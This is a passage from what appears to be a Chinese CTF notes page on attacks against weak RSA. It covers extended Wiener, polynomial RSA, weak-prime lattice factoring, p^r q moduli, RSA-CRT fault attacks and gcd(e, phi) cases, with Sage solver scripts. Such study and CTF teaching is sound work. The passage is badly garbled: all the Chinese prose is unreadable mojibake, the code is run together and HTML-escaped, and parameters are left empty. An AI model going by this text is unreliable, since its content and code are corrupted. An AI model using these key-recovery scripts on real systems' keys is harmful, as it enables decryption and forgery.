v) * adef H(n): if n == 0: return [0] if n == 2: return [(), (1,), (2,), (1, 2)] ret = [] for i in range(3, n+1): ret.append((i,)) for j in range(1, i): for k in my_permutations(range(1, i), j): ret.append(tuple(k + [i])) return H(2) + ret def CC(exp, n): cols = [0 for i in range(1&lt;&lt;n)] # split exp texps = (&#x27;%s&#x27; % exp.exp1.expand()).strip().split(&#x27; - &#x27;) ops = [] exps = [] for i in range(len(texps)): if texps[i].find(&#x27; + &#x27;) != -1: tmp = texps[i].split(&#x27; + &#x27;) ops.append(0) exps.append(tmp[0]) for i in range(1, len(tmp)): ops.append(1) exps.append(tmp[i]) else: ops.append(0) exps.append(texps[i]) if exps[0][0] == &#x27;-&#x27;: for i in range(len(exps)): ops[i] = 1-ops[i] exps[0] = exps[0][1:] else: ops[0] = 1 # find e and N l = [] for i in range(len(exps)): tmp = 1 if ops[i] else -1 en = [] j = 0 while j &lt; len(exps[i]): if exps[i][j] == &#x27;e&#x27;: num = 0 j += 1 while isdigit(exps[i][j]): num = num*10 + int(exps[i][j]) j += 1 tmp *= eval(&#x27;e%d&#x27; % num) en.append(num) elif exps[i][j] == &#x27;N&#x27;: j += 1 num = 0 if exps[i][j] == &#x27;^&#x27;: j += 1 while isdigit(exps[i][j]): num = num*10 + int(exps[i][j]) j += 1 if num == 0: num = 1 tmp *= eval(&#x27;N**%d&#x27; % num) else: j += 1 if tmp == 1 or tmp == -1: l.append((0, ())) else: l.append((tmp, tuple(sorted(en)))) # construct h mp = H(n) for val, en in l: cols[mp.index(en)] = val #print(cols) return colsdef EWA(n, elist, NN, alpha): mp = H(n) var(&#x27;a&#x27;) S = [X_Complex(n*a)] cols = [[1 if i == 0 else 0 for i in range(2^n)]] for i in mp[1:]: eL, s = R(i, n) cols.append(CC(eL, n)) S.append(X_Complex(s)) alphaA,alphaB = 0, 0 for i in S: alphaA = max(i.a, alphaA) alphaB = max(i.b, alphaB) #print(alphaA, alphaB) D = [int(NN^((alphaA-S[i].a)*alpha + (alphaB - S[i].b))) for i in range(len(S))] #print(D) kw = &#123;&#x27;N&#x27;: NN&#125; for i in range(len(elist)): kw[&#x27;e%d&#x27; % (i+1)] = elist[i] print(cols) B = Matrix(ZZ, Matrix(cols).T(**kw)) * diagonal_matrix(ZZ, D) L = B.LLL(0.5) v = Matrix(ZZ, L[0]) x = v * B**(-1) phi = int(x[0,1]/x[0,0]*elist[0]) return phidef attack(NN, elist, alpha): phi = EWA(len(elist), elist, NN, alpha) print(phi)elist = [ ]NN=alpha = 400./2048for i in range(1, len(elist)+1): var(&quot;e%d&quot; % i) var(&quot;d%d&quot; % i) var(&quot;k%d&quot; % i)g, N, s = var(&#x27;g&#x27;), var(&#x27;N&#x27;), var(&#x27;s&#x27;)for i in range(len(elist)): elist[i] = Integer(elist[i])attack(NN, elist, alpha)phi = c= d=inverse(65537,int(phi))m = pow(c,d,NN)print(long_to_bytes(int(m))) å‚è€ƒï¼šè¥¿æ¹–è®ºå‰‘ 2021 - WienerStudyTwice å‚è€ƒPaper Common Modulus Attacks on Small Private Exponent RSA and Some Fast Variants (in Practice) Extending Wienerâ€™s Attack in the Presence of Many Decrypting Exponents â€‹ å¤šé¡¹å¼RSAåœ¨æ•´æ•°RSAåŸç†åŸºç¡€ä¸Šå°†å¤šé¡¹å¼ä»£å…¥åˆ†æï¼š åœ¨æœ‰é™åŸŸä¸Šé€‰å–ä¸¤ä¸ªä¸å¯çº¦å¤šé¡¹å¼ $g(p),g(q)$ï¼Œ$g(n)=g(p) \\cdot g(q)$ï¼Œè®¡ç®—å‡º $g(n)$ çš„æ¬§æ‹‰å‡½æ•° $\\varphi(g(n))=\\varphi$ï¼Œ é€‰å–ä¸€ä¸ªæ•´æ•° $e$ ä½œä¸ºå…¬é’¥ï¼Œ$e$ ä¸ $\\varphi$ æ˜¯äº’ç´ çš„ï¼Œé‚£ä¹ˆå¯¹äºæ˜æ–‡ $g(m)$ï¼ŒåŠ å¯†è¿‡ç¨‹ä¸º $g(m)^e \\equiv g(c) \\pmod {g(n)}$ï¼Œ è®¡ç®—ç§é’¥ $d$ æ»¡è¶³ $ed \\equiv 1 \\pmod \\varphi$ï¼Œåˆ™ $g(c)^d \\equiv (g(m)^e)^d \\equiv g(m)^{ed} \\equiv g(m)^{\\varphi+1} \\pmod {g(n)}$ï¼Œ åŒæ ·è€ƒè™‘ $g(n)$ ä¸ $g(m)$ äº’ç´ ï¼Œæ¬§æ‹‰å®šç†å¯¹äºå¤šé¡¹å¼äº¦æˆç«‹ï¼Œ å¾—åˆ° $g(m)^{\\varphi+1} \\equiv g(m) \\pmod {g(n)}$ï¼Œæ‰€ä»¥ $g(c)^d \\equiv g(m) \\pmod {g(n)}$ã€‚ æ˜¾ç„¶RSAå¯¹äºæ•´æ•°çš„ä½“åˆ¶å¯ä»¥é€‚ç”¨äºæœ‰é™åŸŸä¸Šçš„å¤šé¡¹å¼ã€‚ â˜…æ³¨æ„ï¼š å¯¹äºç´ æ•° $x$ï¼Œ$\\varphi(x)=x-1$ï¼Œä½†æ˜¯å¯¹äºä¸å¯çº¦å¤šé¡¹å¼ $g(x)$ï¼Œ$\\varphi(g(x))=p^n-1$ã€‚ï¼ˆæ­¤ $p$ ä¸º $GF(p)$ çš„æ¨¡ï¼Œæ­¤ $n$ ä¸ºå¤šé¡¹å¼æœ€é«˜é¡¹æ¬¡æ•°ï¼‰ åŸå› ï¼š ç”±æ¬§æ‹‰å‡½æ•°å®šä¹‰æœ¬èº«ï¼Œæ¬§æ‹‰å‡½æ•°æ˜¯å°äº $n$ çš„æ‰€æœ‰ä¸ $n$ äº’è´¨çš„æ•°çš„ä¸ªæ•°ã€‚ å¤šé¡¹å¼çš„æ¬§æ‹‰å‡½æ•°åˆ™ç±»ä¼¼ï¼Œè¡¨ç¤ºä¸é«˜äº $g(x)$ å¹‚çº§çš„ç¯å†…æ‰€æœ‰å¤šé¡¹å¼ä¸­ï¼Œä¸ $g(x)$ æ— å…¬å› å¼ï¼ˆé1ï¼‰çš„å…¶ä»–å¤šé¡¹å¼çš„ä¸ªæ•°ï¼Œæ‰€ä»¥æ¯ä¸€ä¸ªä¸é«˜äº $g(x)$ å¹‚çº§çš„ç¯å†…å¤šé¡¹å¼ï¼ˆé™¤äº†å®ƒè‡ªå·±ï¼‰å‡æ»¡è¶³æ­¤æ¡ä»¶ã€‚ 1234567891011121314151617181920212223#è„šæœ¬1#Sage#å·²çŸ¥p,n,m^ep= P = PolynomialRing(Zmod(p), name = &#x27;x&#x27;)x = P.gen()e = n = c =#åˆ†è§£Nq1, q2 = n.factor()q1, q2 = q1[0], q2[0]#æ±‚Ï†ï¼Œæ³¨æ„æ±‚æ³•ï¼Œphi = (p**q1.degree() - 1) * (p**q2.degree() - 1)assert gcd(e, phi) == 1d = inverse_mod(e, phi)m = pow(c,d,n)#å–å¤šé¡¹å¼ç³»æ•°flag = bytes(m.coefficients())print(&quot;Flag: &quot;, flag.decode()) 1234567891011121314151617181920212223242526#è„šæœ¬2#Sage#å·²çŸ¥p=2,n,e,cp = P = PolynomialRing(GF(p), name = &#x27;x&#x27;)x = P.gen()e = n = R.&lt;a&gt; = GF(2^2049)c = []q1, q2 = n.factor()q1, q2 = q1[0], q2[0]phi = (p**q1.degree() - 1) * (p**q2.degree() - 1)assert gcd(e, phi) == 1d = inverse_mod(e, phi)ans = &#x27;&#x27;for cc in c: cc = P(R.fetch_int(cc)) m = pow(cc,d,n) m = R(P(m)).integer_representation() print(m) ans += chr(m)print(ans) 12345#Sage#x.nbits()==2^32poly = sum(e * x^i for i,e in enumerate(Integer(n).digits(2^32)))(p, _), (q, _) = poly.factor_list()p, q = p(x=2^32), q(x=2^32) å‚è€ƒï¼š 0ctf - babyrsa watevrCTF 2019 - Swedish RSA InCTF 2020 - PolyRSA Polynomial based RSA Crypto CTF2020 - Decent RSA SecurityFest CTF 2022 - small rsa â€‹ Weak prime factors ï¼ˆpå…·çº¿æ€§ç‰¹å¾ï¼‰é€‚ç”¨æƒ…å†µï¼š$p$ æ»¡è¶³ $ap=u_0+M_1u_1+\\cdots+M_ku_k$ å…ˆæ ¹æ® $n$ ç¡®å®š $M$ çš„å¤§å°ï¼Œå†æ ¹æ® $M$ é€‰å–ç¬¦åˆè¦æ±‚çš„ $k$ å’Œ $c$ï¼Œç„¶åæ„é€ ä¸€ä¸ªæ ¼å¦‚ä¸‹ï¼š $M(\\mathcal{L})=\\begin{bmatrix}{1}&amp;{0}&amp;{0}&amp;{\\cdots}&amp;{0}&amp;{CM^{2k}} \\newline{0}&amp;{1}&amp;{0}&amp;{\\cdots}&amp;{0}&amp;{CM^{2k-1}} \\newline {\\vdots}&amp;{\\vdots}&amp;{\\vdots}&amp;{\\ddots}&amp;{\\vdots}&amp;{\\vdots} \\newline {0}&amp;{0}&amp;{0}&amp;{\\cdots}&amp;{1}&amp;{CM} \\newline {0}&amp;{0}&amp;{0}&amp;{\\cdots}&amp;{0}&amp;{-CN} \\newline \\end{bmatrix}$ ç”¨LLLç®—æ³•è¿›è¡Œæ ¼åŸºè§„çº¦ï¼Œå°†è§„çº¦åçš„æŸä¸ªå‘é‡ä½œä¸ºå¤šé¡¹å¼ç³»æ•°ï¼Œå†å¯¹å¤šé¡¹å¼è¿›è¡Œåˆ†è§£ï¼Œå³å¯å®Œæˆå¯¹ $n$ çš„åˆ†è§£ã€‚ å‚è€ƒ Factoring RSA moduli with weak prime factors N1CTF2020 - easyRSA 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from tqdm import tqdmimport gmpy2class success(Exception): passdef attack_weak_prime(basenum, exp, n): m = basenum^exp k = len(n.str(base=basenum))//(2*exp) + 1 c = gmpy2.iroot(2*k^3, int(2)) # assert c[1] == True tmp = int(c[0]) try: for c in tqdm(range(1, tmp)): amount = 2*k+1 M = Matrix(RationalField(), amount, amount) for i in range(amount): M[i, i] = 1 M[i, amount-1] = c*m^(2*k-i) M[amount-1, amount-1] = -c*n new_basis = M.LLL(delta=0.75) for j in range(amount): last_row = list(new_basis[j]) last_row[-1] = last_row[-1]//(-c) poly = sum(e * x^(k*2-i) for i,e in enumerate(last_row)) fac = poly.factor_list() if len(fac) == 2: p_poly, q_poly = fac p_coefficient = p_poly[0].list() q_coefficient = q_poly[0].list() ap = sum(m^i * j for i,j in enumerate(p_coefficient)) bq = sum(m^i * j for i,j in enumerate(q_coefficient)) p = gcd(ap, n) q = gcd(bq, n) if (p*q == n) and (p != 1) and (q != 1): raise success except: print (&#x27;n =&#x27;, n) print (&#x27;p =&#x27;, p) print (&#x27;q =&#x27;, q) print (&#x27;p*q == n ?&#x27;, bool(p*q == n))if __name__ == &#x27;__main__&#x27;: print (&#x27;[+] Weak Prime Factorization Start!&#x27;) print (&#x27;-------------------------------------------------------------------------------------------------------------------------------&#x27;) basenum, exp = (3, 66) n = 32846178930381020200488205307866106934814063650420574397058108582359767867168248452804404660617617281772163916944703994111784849810233870504925762086155249810089376194662501332106637997915467797720063431587510189901 â€‹ på¤šæ¬¡å¹‚å› å­é€‚ç”¨æƒ…å†µï¼š$N=p^rq$ æƒ…å½¢1 æ¡ä»¶ï¼š$(N,e)$ æ»¡è¶³ $ex-\\varphi(N)y=z$ï¼Œå…¶ä¸­ $x$ ä¸ $\\lvert z \\rvert$ ä¸ºå°å‚æ•°ã€‚ $f(x) = ex-z \\equiv 0 \\pmod {p^{r-1}}$ è®¡ç®— $\\gcd(ex - z,N)=g$ï¼Œåˆ™ $p = \\begin{cases} g^{\\frac{1}{r-1}},\\text{if } g=p^{r-1} \\newline g^{\\frac{1}{r}},\\text{if } g=p^{r} \\newline \\frac{N}{g},\\text{if } g=p^{r-1}q \\end{cases}$ 1234P.&lt;x&gt; = PolynomialRing(Zmod(n))f = e * x - broot = f.monic().small_roots(X=2**672,beta=0.75)[0]g = gcd(int(e * root - b),n3) æƒ…å½¢2 æ¡ä»¶ï¼šå° $\\lvert d_1-d_2 \\rvert$ï¼Œ$\\lvert d_1-d_2 \\rvert \\lt N^{\\frac{r(r-1)}{(r+1)^2}}$ã€‚ $f(x) = e_1e_2(d_1-d_2) - (e_2-e_1) \\equiv 0 \\pmod {p^{r-1}}$ ç­‰ä»·äº $g(x) = x-a \\equiv 0 \\pmod {p^{r-1}}$ï¼Œå…¶ä¸­ $a \\equiv (e_2-e_1)(e_1e_2)^{-1} \\pmod {N}$ã€‚ è®¡ç®— $\\gcd(e_1e_2x - (e_2-e_1),N)=g$ï¼Œåˆ™ $p = \\begin{cases} g^{\\frac{1}{r-1}},\\text{if } g=p^{r-1} \\newline g^{\\frac{1}{r}},\\text{if } g=p^{r} \\newline \\frac{N}{g},\\text{if } g=p^{r-1}q \\end{cases}$ 1234P.&lt;x&gt; = PolynomialRing(Zmod(n))f = e1*e2*x - e1 + e2root = f.monic().small_roots(X=2**672,beta=0.75)[0]g = gcd(int(e1*e2*root - e1 + e2),n) æƒ…å½¢3 æ¡ä»¶ï¼š$N_1=p_1^rq_1,N_2=p_2^rq_2$ï¼Œå° $\\lvert p_1-p_2 \\rvert$ï¼Œ$\\lvert p_1-p_2 \\rvert \\lt \\cfrac{p_1}{2rq_1q_2}$ã€‚ $\\left| \\cfrac{N_2}{N_1} - \\cfrac{q_2}{q_1} \\right| = \\cfrac{q_1q_2 \\lvert p_1^r - p_2^r \\rvert}{q_1^2p_1^r} &lt; \\cfrac{1}{2q_1^2}$ åˆ©ç”¨ $\\cfrac{N_2}{N_1}$ çš„è¿åˆ†æ•°å±•å¼€å¯¹åº”çš„æ¸è¿›åˆ†æ•°é€¼è¿‘ $\\cfrac{q_2}{q_1}$ã€‚ 12345678910111213cf = continued_fraction(n1/n2)fracs = cf.convergents()for xx in tqdm(fracs): q1 = xx.numerator() q2 = xx.denominator() if q1.nbits() in range(511, 513) and q2.nbits() in range(511, 513): if n1 % q1 == 0: print(q1) assert n1 % q1 == 0 p1 = int((n1 // q1)^(1/2)) p2 = int((n2 // q2)^(1/2)) assert p1^2 * q1 == n1 break å‚è€ƒï¼š New attacks on RSA with Moduli $N = p^rq$ D^3CTF 2022 - d3factor â€‹ RSA-CRT æ•…éšœæ³¨å…¥æ”»å‡» RSA-CRT fault attack å‡è®¾åœ¨è®¡ç®— $S_q$ æ—¶å‘ç”Ÿäº†é”™è¯¯ï¼Œ$S_q=m_q^{d_q} \\bmod q$ï¼Œ$m_q=m \\bmod q$ï¼Œ$d_q=d \\bmod (q-1)$ï¼Œ æ­£ç¡®ç­¾åï¼š$S=S_p \\cdot(q^{-1} \\bmod p) \\cdot q+S_q \\cdot(p^{-1} \\bmod q) \\cdot p$ï¼Œ é”™è¯¯ç­¾åï¼š$\\hat{S} = S_p \\cdot (q^{-1} \\bmod p) \\cdot q + \\hat{S_q} \\cdot (p^{-1} \\bmod q) \\cdot p$ï¼Œ åˆ™ $S - \\hat{S} = (S_q - \\hat{S_q}) \\cdot (p^{-1} \\bmod q) \\cdot p$ï¼Œå³æœ‰ $p=\\gcd(S-\\hat{S},N)$ã€‚ æˆ–ç”±é”™è¯¯ç­¾å $\\hat{S}$ï¼Œæœ‰ $p=\\gcd(Sâ€™^e-m,N)$ã€‚ é”™è¯¯æ¨¡æ”»å‡» æœ‰æ˜æ–‡ $m$ ç»å¯¹åº”ç¼–ç åçš„ $\\sigma_p = \\mu(m)^d \\bmod p, \\sigma_q = \\mu(m)^d \\bmod q$ï¼Œç”ŸæˆRSA-CRTç­¾å $\\sigma = (\\sigma_p\\cdot\\alpha + \\sigma_q\\cdot\\beta) \\bmod N$ï¼Œå…¶ä¸­å‚æ•° $\\alpha = q \\cdot (q^{-1} \\bmod p),\\beta = p \\cdot (p^{-1} \\bmod q)$ã€‚ åˆ©ç”¨é”™è¯¯æ¨¡æ³¨å…¥æŠ€æœ¯å¾—åˆ°é”™è¯¯ç­¾å $\\sigmaâ€™$ï¼Œå³ $\\sigmaâ€™ = (\\sigma_p\\cdot\\alpha + \\sigma_q\\cdot\\beta) \\bmod Nâ€™$ï¼Œ å¯¹ç”Ÿæˆçš„ä¸¤ç§ç­¾å $\\sigma$ å’Œ $\\sigmaâ€™$ ä½¿ç”¨CRTå¯è®¡ç®—å‡º $v=(\\sigma_p\\cdot\\alpha + \\sigma_q\\cdot\\beta) \\bmod (N \\cdot Nâ€™)$ã€‚ é’ˆå¯¹ $l \\ge 5$ çš„ç¼–ç åæ¶ˆæ¯è¿›è¡Œåˆ†æï¼Œé€šè¿‡è®¡ç®—ç­¾åå¯¹ $(\\sigma,\\sigmaâ€™)$ åˆ†è§£ $N$ çš„æ”»å‡»æ–¹æ³•ï¼š å¯¹æ‰€æœ‰çš„ $i$ï¼Œè®¡ç®—å‡ºå¯¹åº”çš„æ•´æ•° $v_i= \\text{CRT}_{N,Nâ€™}(\\sigma_i,\\sigma_iâ€™)$ï¼Œè¿™äº›å¯¹åº”çš„ $v_i$ æ„æˆ $\\mathbb{Z}^l$ ä¸Šçš„å‘é‡ $\\mathbf{v}=(v_1,\\cdots,v_i)$ï¼› åˆ©ç”¨LLLå®šç†è®¡ç®—å‡ºå‚ç›´äºå‘é‡ $\\mathbf{v}$ çš„æ­£äº¤æ ¼ $\\mathbf{v}^{\\perp}$ çš„è§„çº¦åŸº $\\mathbf{b}_1,\\cdots,\\mathbf{b}_{l-1}$ï¼Œå…¶ä¸­æ‰€æœ‰çš„å‘é‡å’Œæ ¼çš„åˆ†å¸ƒéƒ½æ˜¯åœ¨ $\\mathbb{Z}^l$ å†…ã€‚é€šè¿‡å¯¹å­˜åœ¨äº $\\mathbb{Z}^{1+l}$ ä¸­çš„æ ¼åº”ç”¨LLLå®šç†ï¼Œå³å¯¹å¦‚ä¸‹çŸ©é˜µä½¿ç”¨LLLå®šç†ï¼š $\\begin{pmatrix} kv_1 &amp; 1 &amp; &amp; 0 \\newline \\vdots&amp; &amp; \\ddots &amp; \\newline kv_l &amp; 0 &amp; &amp; 1 \\end{pmatrix}$ å…¶ä¸­ $k$ ä¸ºåˆé€‚çš„å¤§å¸¸é‡ï¼Œå¹¶å»é™¤è®¡ç®—å‡ºæ¥çš„å‘é‡çš„ç¬¬1ä¸ªå…ƒç´ ï¼› å‰ $l-2$ ä¸ªå‘é‡ $\\mathbf{b}_1,\\cdots,\\mathbf{b}_{l-2}$ å°†ç”Ÿæˆç§©ä¸º $l-2$ çš„æ ¼ $Lâ€™$ï¼Œå†æ¬¡åˆ©ç”¨LLLå®šç†æ¥è®¡ç®—å‡ºæ­£äº¤æ ¼ $(Lâ€™)^{\\perp}$ çš„è§„çº¦åŸº $\\mathbf{x}â€™,\\mathbf{y}â€™$ã€‚åŒæ ·å¯ä»¥é€šè¿‡å¯¹å¦‚ä¸‹çŸ©é˜µä½¿ç”¨LLLå®šç†å¾—åˆ°å¯¹åº”çš„è§„çº¦åŸºï¼š $\\begin{pmatrix} kâ€™b_{1,1} &amp; \\cdots &amp; kâ€™b_{l-2,1} &amp; 1 &amp; &amp; 0 \\newline \\vdots&amp; &amp; \\vdots &amp; &amp; \\ddots &amp; \\newline kâ€™b_{1,l} &amp; \\cdots &amp; kâ€™b_{l-2,l}&amp; 0 &amp; &amp; 1 \\end{pmatrix}$ åŒæ­¥éª¤2ï¼Œä¿ç•™è®¡ç®—å‡ºæ¥çš„å‘é‡çš„æœ€å $l$ ä¸ªå…ƒç´ ï¼› å°†æ‰€æœ‰é•¿åº¦ä¸è¶…è¿‡ $\\sqrt{lN}$ çš„å¹¶åœ¨ $(Lâ€™)^{\\perp}$ å†…çš„å‘é‡ $\\mathbf{z}=a \\mathbf{x}â€™+b \\mathbf{y}â€™$ åˆ—ä¸¾å‡ºæ¥ï¼Œå¯¹ç¬¦åˆæ¡ä»¶çš„å‘é‡ $\\mathbf{z}$ï¼Œè®¡ç®—å‡º $\\gcd(\\mathbf{v}-\\mathbf{z},N)$ï¼Œå¯ä»¥å¾—å‡º $N$ ä¸­ä»»ä½•å¯èƒ½çš„ç´ å› å­ã€‚ 12345678910111213141516171819202122232425262728from tqdm import tqdmimport gmpy2,sysdef orthogonal_lattice(B): LB = B.transpose().left_kernel(basis=&quot;LLL&quot;).basis_matrix() return LB cs = []s = []l = 6v = []for i in range(len(cs_)): v.append(int(crt([s_[i], cs_[i]], [n, N]))) v = vector(ZZ, v)Lv = orthogonal_lattice(Matrix(v))L1 = orthogonal_lattice(Lv.submatrix(0, 0, l-2, l))x, y = L1for a in tqdm(range(333)): for b in tqdm(range(333)): z = a*x+b*y for each in (v-z): tmp = gcd(each,n) if tmp&gt;1: p = tmp print(p) sys.exit() å‚è€ƒï¼š Modulus Fault Attacks Against RSA-CRT Signatures 2022å·…å³°æå®¢ - Learning with Fault â€‹ å…¶ä»–ç‰¹åˆ«æƒ…å½¢ å¤šç´ æ•°å› å­ï¼ˆMulti-prime RSAï¼‰$n=p_1^{k_1}p_2^{k_2}\\cdots p_m^{k_m} \\\\ \\Rightarrow \\begin{eqnarray}\\varphi(n) &amp;=&amp;\\varphi(p_1^{k_1})\\varphi(p_2^{k_2}) \\cdots \\varphi(p_m^{k_m}) \\\\ &amp;=&amp;(p_1^{k_1-1}\\cdot(p_1-1))(p_2^{k_2-1}\\cdot(p_2-1)) \\cdots (p_m^{k_m-1}\\cdot(p_m-1)) \\end{eqnarray}$ â€‹ next_prime() æ ¹æ®ç´ æ•°å®šç†ï¼Œç´ æ•°çš„å¹³å‡é—´éš”ä¸ºï¼š$\\cfrac{x}{\\pi(x)} \\approx \\ln(x)$ï¼Œå› æ­¤å¸¸è§çš„ä¸‹ä¸€ä¸ªç´ æ•°æ¯”å½“å‰ç´ æ•°å¤§ä¸€ç‚¹ï¼Œä¸€èˆ¬ä¸ä¼šè¶…è¿‡1500ã€‚ å˜ç§1ï¼š$n=p \\cdot q \\cdot \\text{nextprime}(p) \\cdot \\text{nextprime}(q)$ è´¹é©¬å› å¼åˆ†è§£ã€‚ â€‹ ç»™ e,p,c $c \\equiv m^e \\pmod n \\\\\\Leftrightarrow c_1 \\equiv c \\pmod p \\equiv m^e \\pmod p$ ä»¤ $ed_1 \\equiv 1 \\pmod {(p-1)}$ï¼Œæœ‰ $m \\equiv c^d \\pmod n \\equiv c_1^{d_1} \\pmod p$ã€‚ â€‹ ç»™ e,d,modinv(q,p),cå·²çŸ¥ï¼š$p,q$ åŒæ¯”ç‰¹ä½æ•°ã€‚ ä»¤ $cf=q^{-1} \\bmod p$ï¼Œæœ‰ $q\\cdot cf=1 \\pmod p$ã€‚ $ed=1+k(p-1)(q-1)$ï¼Œ æ¯”è¾ƒæ¯”ç‰¹ä½æ•°ï¼Œ$k$ ä¸ $e$ åŒé•¿ï¼Œå¯çˆ†ç ´ $k$ï¼Œå¾— $\\varphi(n)=(p-1)(q-1)=\\cfrac{ed-1}{k}$ï¼› ä¸Šå¼ $\\varphi(n) =(p-1)(q-1) \\pmod p=-(q-1) \\pmod p$ï¼Œ ç»“åˆ $q\\cdot cf=1 \\pmod p$ï¼Œå³ $q\\cdot cf-1=0 \\pmod p$ï¼Œ è”ç«‹ï¼š $\\begin{eqnarray} \\varphi(n)&amp;=&amp;(p-1)(q-1)\\\\&amp;=&amp;pq-p-q+1\\\\&amp;=&amp;n-p-q+1 \\end{eqnarray}$ $\\begin{eqnarray} cf\\cdot \\varphi(n)&amp;=&amp;cf\\cdot(n-p-q+1)\\\\&amp;=&amp;cf\\cdot n-cf\\cdot p-cf\\cdot q+cf \\end{eqnarray}$ $\\begin{eqnarray} cf\\cdot \\varphi(n) \\bmod p&amp;=&amp;(cf\\cdot n-cf\\cdot p-cf\\cdot q+cf) \\bmod p\\\\&amp;=&amp;0-0-(cf\\cdot q)+cf \\bmod p\\\\&amp;=&amp;-1+cf \\bmod p \\end{eqnarray}$ æœ‰ $1+cf\\cdot \\varphi(n)-cf=0\\pmod p$ï¼Œ å³$x=1+cf\\cdot \\varphi(n)-cf$ èƒ½è¢« $p$ æ•´é™¤ï¼› ç”±è´¹é©¬å°å®šç†ï¼Œå­˜åœ¨ $r$ æ»¡è¶³ $r^{p-1}=1 \\pmod p$ï¼Œ $\\begin{eqnarray}r^{\\varphi(n)}&amp;=&amp;(r^{(p-1)})^{(q-1)}\\\\&amp;=&amp;1^{(q-1)} \\pmod p\\\\&amp;=&amp;1 \\pmod p \\end{eqnarray}$ï¼Œ å› å¯¹äºä»»æ„ $r,k_1,k_2$ï¼Œå½“ $k_2$ ä¸º $k_1$ å› å­æ—¶ï¼Œ$r \\bmod k_2=(r \\bmod k_1) \\bmod k_2$ï¼Œ æ•… $r^{\\varphi(n)} \\bmod p=(r^{\\varphi(n)} \\bmod x) \\bmod p=1 \\bmod p=kp$ï¼Œ å·²çŸ¥ $\\varphi(n)$ï¼Œç”± $(r^{\\varphi(n)} \\bmod x) \\bmod p=kp$ å¯å¾—åˆ°å¤šç»„ $p$ çš„ä¹˜ç§¯ï¼Œè®¡ç®— $\\gcd$ å¯å¾—åˆ° $p$ï¼› ç”± $q\\cdot cf=1 \\pmod p$ æ±‚æ¨¡é€†å¯å¾— $q$ï¼Œå†ç”¨ $c$ è®¡ç®—å‡º $m$ã€‚ å‚è€ƒï¼šTSG CTF 2020 - Modulus Amittendus â€‹ gcd(e,Ï†(n)) â‰  1$\\gcd(e,\\varphi(n))\\neq 1$ æ—¶ï¼Œ$e$ ä¸ $\\varphi(n)$ ä¸äº’ç´ ï¼Œ $m^e \\equiv (m^{\\gcd(e,\\varphi(n))})^{\\frac{e}{\\gcd(e,\\varphi(n))}} \\equiv c \\pmod n$ï¼Œè®¡ç®— $\\frac{e}{\\gcd(e,\\varphi(n))}$ çš„æ¨¡é€† $dâ€™$ï¼Œ åˆ™ $c^{dâ€™}\\equiv m^{\\gcd(e,\\varphi(n))}\\pmod n$ã€‚ å½“ $\\gcd(e,\\varphi(n))$ è¾ƒå°æ—¶ï¼Œå¯ä»¥ç›´æ¥å¯¹ $c$ å¼€æ ¹ï¼Œæœ‰ä¸¤ç§æƒ…å†µï¼š $m^e = c&lt;n$ï¼Œè¿™ç§æƒ…å†µç›´æ¥å¯¹ $c$ å¼€ $e$ æ¬¡æ–¹å³å¯ï¼› $m^e = c&gt;n$ï¼Œè¿™ç§æƒ…å†µéœ€è¦åœ¨æœ‰é™åŸŸä¸‹å¯¹ $c$ å¼€æ–¹ï¼Œä¸€èˆ¬å…ˆè®¡ç®— $c_p=c \\bmod p$ï¼Œ$c_q=c \\bmod q$ï¼Œåˆ†åˆ«æ±‚å‡º $c_p,c_q$ åœ¨ $c$ ä¸‹çš„ $e$ æ¬¡æ ¹ï¼ˆå¯èƒ½æœ‰å¤šä¸ªï¼‰ï¼Œç„¶åä½¿ç”¨CRTéå†æ‰€æœ‰ç»„åˆï¼Œåˆ†åˆ«checkå¾—å‡ºæ˜æ–‡ã€‚ å½“ $\\gcd(e,\\varphi(n))$ è¾ƒå¤§æ—¶ï¼Œæ±‚ $p,q$ çš„ $e$ æ¬¡æ ¹æ­¥éª¤éœ€è¦æ›¿æ¢ä¸ºä¸€äº›æœ‰é™åŸŸå¼€æ ¹çš„é«˜æ•ˆç®—æ³•ï¼ˆå¦‚AMMç®—æ³•ç­‰ï¼‰è¿›è¡Œè®¡ç®—ã€‚ å‚è€ƒï¼š De1CTF2019 - Baby RSA 0ctf 2016 - RSA? â€‹ e|(p-1), e|(q-1)ä¸Šé¢çš„ $\\gcd(e,\\varphi(n))\\neq 1$ æƒ…å†µä¸é’ˆå¯¹ $\\gcd(e,\\varphi(n))= e$ï¼Œè¿™é‡Œå¯¹ $e\\mid (p-1),e\\mid (q-1)$ çš„ç‰¹æ®Šæƒ…å†µè¿›è¡Œè®¨è®ºã€‚ è§£é¢˜æ€è·¯å³æ±‚è§£ $m \\bmod p$ å’Œ $m \\bmod q$ ï¼Œå†é€šè¿‡CRTè¿˜åŸ $m \\bmod n$ã€‚ä¸»è¦éš¾ç‚¹åˆ™æ˜¯åœ¨ $\\text{GF}(p)$ ä¸Šæ±‚ $e$ æ¬¡æ ¹ã€‚ åœ¨æœ‰é™åŸŸä¸Šæ±‚r-th rootæœ‰ä¸¤ä¸ªå¸¸è§ç®—æ³•ï¼ˆAdleman-Manders-Miller algorithmå’ŒCipolla-Lehmer algorithmï¼‰ï¼ŒNamhun Kooæå‡ºä¸€ç§æ›´å…·ä¸€èˆ¬æ€§çš„å¼€æ ¹ç®—æ³•ï¼Œä¸”åœ¨ $s$ è¶³å¤Ÿå°çš„æ—¶å€™æ›´é«˜æ•ˆï¼ˆ$r^{s}\\mid (p-1),r^{s}\\nmid (p-1)$ï¼‰ã€‚ â˜…å‚è€ƒï¼šNCTF 2019 - easyRSA ï¼ˆAdleman-Manders-Miller rth Root Extraction Methodï¼‰ æœ¬é¢˜åˆ™ä¸º $e$ å’Œ $p-1$ ï¼ˆæˆ– $q-1$ï¼‰çš„æœ€å¤§å…¬çº¦æ•°å°±æ˜¯ $e$ æœ¬èº«ï¼Œä¹Ÿå°±æ˜¯è¯´ $e\\mid (p-1)$ï¼Œåªæœ‰å¯¹ $c$ å¼€ $e$ æ¬¡æ–¹æ ¹æ‰è¡Œã€‚ å¯ä»¥å°†åŒä½™æ–¹ç¨‹ $m^e \\equiv c \\pmod n$ åŒ–æˆ $\\begin{cases} m^e \\equiv c \\pmod p \\\\ m^e \\equiv c \\pmod q \\end{cases}$ ç„¶ååˆ†åˆ«åœ¨ $\\text{GF}(p)$ å’Œ $\\text{GF}(q)$ ä¸Šå¯¹ $c$ å¼€ $e$ æ¬¡æ–¹æ ¹ï¼Œå†ç”¨CRTç»„åˆä¸€ä¸‹å³å¯å¾—åˆ°åœ¨ $\\bmod n$ ä¸‹çš„è§£ã€‚ 